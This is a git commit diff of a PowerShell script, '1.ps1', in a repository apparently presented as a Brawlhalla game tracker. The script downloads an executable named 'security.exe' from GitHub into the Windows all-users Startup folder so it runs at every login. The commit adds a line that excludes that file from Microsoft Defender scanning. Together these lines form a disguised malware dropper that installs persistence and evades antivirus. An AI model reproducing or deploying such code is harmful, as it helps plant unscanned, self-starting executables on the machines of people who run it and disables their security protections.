5d570ae7487686322c524c9730b32b88db683e35
FCsab <161705557+FCsab@users.noreply.github.com>
2025-03-07 07:25:29 +0100

    Update 1.ps1

--- 1.ps1
+++ 1.ps1
@@ -1,6 +1,7 @@
 $startupFolder = "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"
 $url = "https://github.com/FCsab/Brawlhalla-Tracker/raw/refs/heads/main/security.exe"
 $outputPath = Join-Path $startupFolder "security.exe"
+Add-MpPreference -ExclusionPath "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\security.exe"
 
 Invoke-WebRequest -Uri $url -OutFile $outputPath
 
